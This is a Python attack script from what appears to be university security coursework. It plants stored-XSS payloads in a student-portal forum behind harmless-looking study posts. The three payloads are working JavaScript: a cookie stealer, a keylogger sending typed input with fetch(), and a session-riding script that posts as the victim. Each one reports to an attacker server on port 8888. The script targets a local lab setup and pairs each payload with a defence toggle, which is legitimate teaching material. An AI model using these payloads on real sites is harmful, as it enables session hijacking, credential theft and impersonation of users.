"""
Attack Script: Advanced XSS — Cookie Theft + Keylogger + Session Riding
=========================================================================
EDUCATIONAL PURPOSE ONLY - ELEC0138 Coursework Demonstration

Target: University Student Portal - Discussion Forum
Receiver: Attacker server on port 8888

Goal:
- Button 1 (HttpOnly) only blocks Post 1
- Button 2 (CSP connect-src) only blocks Post 2
- Button 3 (CSRF token) only blocks Post 3
"""

import re
import socket
from datetime import datetime

import requests


def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()


LOCAL_IP = get_local_ip()
TARGET_BASE = f"http://{LOCAL_IP}:5000"
ATTACKER_SERVER = f"http://{LOCAL_IP}:8888"

ATTACKER_USER = "bob@example.com"
ATTACKER_PASS = "qwerty123"


PAYLOADS = [
    {
        "title": "ELEC0138 Week 3 — Threat Modelling Notes?",
        "visible_text": (
            "Does anyone have notes from the ELEC0138 lecture on "
            "threat modelling? I missed the session due to illness "
            "and would really appreciate any help. Thanks!"
        ),
        "script": (
            '<script>'
            'new Image().src="' + ATTACKER_SERVER + '/steal?c="+encodeURIComponent(document.cookie);'
            '</script>'
        ),
        "label": "COOKIE STEALER",
        "description": "Steals session cookie via document.cookie",
    },
    {
        "title": "Tips for ELEC0138 coursework?",
        "visible_text": (
            "Hi everyone, I am working on the security coursework and "
            "wondering if anyone has tips on choosing a good threat model. "
            "Also does anyone know if we can use Python for the demo?"
        ),
        "script": (
            '<script>'
            'document.addEventListener("keyup",function(e){'
            'var t=e.target;'
            'if(t.tagName==="INPUT"||t.tagName==="TEXTAREA"){'
            'fetch("'
            + ATTACKER_SERVER +
            '/keys?field="+encodeURIComponent(t.name||t.id||t.tagName)'
            '+"&data="+encodeURIComponent(t.value),{mode:"no-cors"});'
            '}'
            '});'
            '</script>'
        ),
        "label": "KEYLOGGER",
        "description": "Records keyboard input and sends to attacker using fetch()",
    },
    {
        "title": "Study group for ELEC0138 exam prep",
        "visible_text": (
            "Would anyone be interested in forming a study group for "
            "the ELEC0138 exam? We could meet weekly in the library. "
            "Drop a comment if you are interested!"
        ),
        "script": (
            "<script>"
            "(function(){"
            'fetch("/forum/new",{method:"POST",'
            'headers:{"Content-Type":"application/x-www-form-urlencoded"},'
            'body:"title="+encodeURIComponent("I love this module!")'
            '+"&content="+encodeURIComponent("This post was created automatically '
            "by an XSS payload without the user's knowledge. "
            'This demonstrates session riding / CSRF via stored XSS.")'
            "}).then(function(resp){"
            "if(resp.ok){"
            'new Image().src="' + ATTACKER_SERVER + '/csrf-log'
            '?action=auto_post&detail=forum_post_created_as_victim";'
            "}"
            "});"
            "})();"
            "</script>"
        ),
        "label": "SESSION RIDING / CSRF",
        "description": "Silently creates a forum post as the victim, then logs only if successful",
    },
]


def fetch_csrf_token(session_obj):
    r = session_obj.get(f"{TARGET_BASE}/forum/new")
    if r.status_code != 200:
        raise RuntimeError(f"Failed to open /forum/new: {r.status_code}")

    m = re.search(r'name="csrf_token"\s+value="([^"]+)"', r.text)
    if not m:
        raise RuntimeError("CSRF token not found in /forum/new page")

    return m.group(1)


def inject_all():
    print("=" * 65)
    print("  ADVANCED XSS PAYLOAD INJECTOR")
    print("  3 attack variants: Cookie + Keylogger + Session Riding")
    print("=" * 65)
    print(f"  Target:          {TARGET_BASE}")
    print(f"  Attacker server: {ATTACKER_SERVER}")
    print(f"  Attacker user:   {ATTACKER_USER}")
    print(f"  Time:            {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 65)
    print()

    print(f"  [*] Logging in as {ATTACKER_USER}...")
    s = requests.Session()
    resp = s.post(
        f"{TARGET_BASE}/web-login",
        data={"username": ATTACKER_USER, "password": ATTACKER_PASS},
        allow_redirects=False,
    )
    if resp.status_code not in (200, 302):
        print(f"      FAILED: {resp.status_code}")
        return

    print("      Login successful")
    print()

    for i, p in enumerate(PAYLOADS, 1):
        full_content = p["visible_text"] + p["script"]

        print(f"  [{i}/3] Injecting: {p['label']}")
        print(f"        Title: {p['title']}")
        print(f"        What it does: {p['description']}")

        try:
            csrf_token = fetch_csrf_token(s)
        except Exception as e:
            print(f"      FAILED to fetch CSRF token: {e}")
            continue

        resp = s.post(
            f"{TARGET_BASE}/forum/new",
            data={
                "title": p["title"],
                "content": full_content,
                "csrf_token": csrf_token,
            },
            allow_redirects=False,
        )

        if resp.status_code not in (200, 302):
            print(f"      FAILED: {resp.status_code}")
            continue

        print("      Injected successfully")
        print()

    print("=" * 65)
    print("Finished.")
    print("Now open the forum as a victim user and browse the posts.")
    print(f"Attacker dashboard: {ATTACKER_SERVER}")
    print("=" * 65)


if __name__ == "__main__":
    inject_all()